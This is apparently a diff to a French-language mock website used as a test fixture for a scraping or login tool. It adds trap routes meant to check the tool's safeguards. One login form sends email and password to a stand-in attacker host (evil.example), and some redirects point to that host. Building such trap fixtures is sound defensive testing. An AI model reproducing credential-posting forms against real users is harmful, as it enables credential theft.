@@ -31,6 +31,13 @@ export async function demarrerSite() {
       });
       return;
     }
+    // Pièges de la relecture : formulaire qui envoie ailleurs, mot de passe en champ texte, redirections vers un autre hôte.
+    if (u.pathname === '/login-piege') return envoyer(200, 'text/html', page('Connexion', '<form method="post" action="https://evil.example/vol"><input id="email" name="email"><input id="password" name="password" type="password"><button type="submit">Se connecter</button></form>'));
+    if (u.pathname === '/login-texte') return envoyer(200, 'text/html', page('Avis', '<form method="post" action="/avis"><input id="email" name="email"><input id="password" name="avis"><button type="submit">Envoyer</button></form>'));
+    if (u.pathname === '/login-deux-formulaires') return envoyer(200, 'text/html', page('Connexion', '<form action="/login"><input id="email" name="email"></form><form action="/avis"><input id="password" type="password"><button type="submit">Ok</button></form>'));
+    if (u.pathname === '/redir') return envoyer(302, 'text/plain', '', { location: 'https://evil.example/' });
+    if (u.pathname === '/docs/redir.pdf') return envoyer(302, 'text/plain', '', { location: 'https://evil.example/x.pdf' });
+    if (u.pathname.startsWith('/prive/')) return envoyer(200, 'text/html', page('Privé', '<p>privé</p>'));
     if (u.pathname === '/login') return envoyer(200, 'text/html', page('Connexion', '<form method="post" action="/login"><input id="email" name="email"><input id="password" name="password" type="password"><button type="submit">Se connecter</button></form>'));
     if (u.pathname === '/compte') return envoyer(200, 'text/html', page('Compte', connecte ? '<div class="mon-compte">Bonjour</div>' : '<p>Non connecté</p>'));
     if (u.pathname === '/robots.txt') return envoyer(200, 'text/plain', 'User-agent: *\nDisallow: /prive/\n');
@@ -43,6 +50,10 @@ export async function demarrerSite() {
     if (u.pathname === '/produit/2') return envoyer(200, 'text/html', produit(2, 'P700100', 'Pierre', '980,50 €'));
     if (u.pathname === '/produit/3') return connecte ? envoyer(200, 'text/html', produit(3, 'C07768-06', 'Toron', '1 450,00 €')) : envoyer(302, 'text/plain', '', { location: '/login' });
     if (u.pathname === '/produit/4' || u.pathname === '/produit/5') return envoyer(200, 'text/html', page('Sans ref', '<h1>Sans référence</h1>'));
+    if (u.pathname === '/liste-une-sans-ref') return envoyer(200, 'text/html', page('Liste', '<a class="p" href="/produit/1">1</a><a class="p" href="/produit/2">2</a><a class="p" href="/produit/4">4</a>'));
+    // Fiche servie en 200 sans session, mais qui n'est qu'une invitation à se connecter (pas la fiche) : provenance « compte ».
+    if (u.pathname === '/produit/6') return connecte ? envoyer(200, 'text/html', produit(6, 'P606060', 'Bûcheron', '700,00 €')) : envoyer(200, 'text/html', page('Connexion requise', '<p>Connectez-vous</p>'));
+    if (u.pathname === '/liste-6') return envoyer(200, 'text/html', page('Liste', '<a class="p" href="/produit/6">6</a><a class="p" href="/produit/1">1</a>'));
     if (u.pathname === '/liste-sans-ref') return envoyer(200, 'text/html', page('Liste', '<a class="p" href="/produit/4">4</a><a class="p" href="/produit/5">5</a><a class="p" href="/produit/1">1</a>'));
     if (u.pathname.startsWith('/docs/')) return envoyer(200, 'application/pdf', PDF);
     if (u.pathname.startsWith('/img/')) return envoyer(200, 'image/jpeg', Buffer.from([0xff, 0xd8, 0xff, 0xd9]));
